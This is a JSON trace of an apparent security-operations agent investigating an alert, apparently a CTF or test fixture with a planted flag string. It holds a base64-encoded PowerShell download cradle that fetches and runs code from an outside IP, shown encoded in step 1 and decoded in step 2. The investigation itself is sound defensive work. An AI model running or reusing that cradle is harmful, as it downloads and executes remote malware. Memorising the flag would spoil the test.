@@ -1,0 +1,88 @@
+{
+  "agent_id": "soc-investigator-001",
+  "alert_id": "ALERT-2024-0115-001",
+  "start_time": "2024-01-15T14:30:00Z",
+  "end_time": "2024-01-15T14:32:15Z",
+  "steps": [
+    {
+      "step": 1,
+      "thought": "I received an alert about suspicious process execution. I should first get the full alert details.",
+      "action": "get_alert_details",
+      "action_input": {"alert_id": "ALERT-2024-0115-001"},
+      "observation": {
+        "alert_type": "Suspicious Process",
+        "host": "WORKSTATION-42",
+        "process": "powershell.exe",
+        "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAxADQAMwAuADIAMgAzAC4ANAA3AC8AcABhAHkAbABvAGEAZAAnACkA",
+        "user": "jsmith",
+        "timestamp": "2024-01-15T14:28:00Z"
+      }
+    },
+    {
+      "step": 2,
+      "thought": "The command line is base64 encoded. I should decode it to understand what it does.",
+      "action": "decode_base64",
+      "action_input": {"encoded": "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAxADQAMwAuADIAMgAzAC4ANAA3AC8AcABhAHkAbABvAGEAZAAnACkA"},
+      "observation": {
+        "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://185.143.223.47/payload')",
+        "analysis": "PowerShell download cradle - downloads and executes remote code"
+      }
+    },
+    {
+      "step": 3,
+      "thought": "This is a classic download cradle. I need to check the IP address in threat intelligence.",
+      "action": "lookup_ip",
+      "action_input": {"ip": "185.143.223.47"},
+      "observation": {
+        "ip": "185.143.223.47",
+        "classification": "Malicious",
+        "category": "C2 Server",
+        "first_seen": "2024-01-10",
+        "reports": 15
+      }
+    },
+    {
+      "step": 4,
+      "thought": "The IP is confirmed malicious C2. I should check if any files were downloaded to the host.",
+      "action": "get_host_files",
+      "action_input": {"host": "WORKSTATION-42", "time_range": "1h"},
+      "observation": {
+        "new_files": [
+          {"path": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.exe", "hash": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4", "size": 45000}
+        ]
+      }
+    },
+    {
+      "step": 5,
+      "thought": "A payload was downloaded. I need to check this file hash in threat intelligence.",
+      "action": "lookup_hash",
+      "action_input": {"hash": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"},
+      "observation": {
+        "hash": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
+        "classification": "Malicious",
+        "malware_family": "Cobalt Strike Beacon",
+        "first_seen": "2024-01-12",
+        "hidden_data": "FLAG{AG3NT_D3T3CT1V3}",
+        "ttps": ["T1059.001", "T1071.001", "T1055"]
+      }
+    },
+    {
+      "step": 6,
+      "thought": "This is confirmed Cobalt Strike. I have enough evidence to escalate this incident.",
+      "action": "create_incident",
+      "action_input": {
+        "severity": "Critical",
+        "title": "Cobalt Strike Beacon Detected on WORKSTATION-42",
+        "iocs": ["185.143.223.47", "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"],
+        "affected_host": "WORKSTATION-42",
+        "recommendation": "Isolate host immediately"
+      },
+      "observation": {
+        "incident_id": "INC-2024-0115-001",
+        "status": "Created",
+        "assigned_to": "soc-tier2"
+      }
+    }
+  ],
+  "final_answer": "Alert ALERT-2024-0115-001 is confirmed malicious. Cobalt Strike beacon detected on WORKSTATION-42. Incident INC-2024-0115-001 created and escalated to Tier 2."
+}
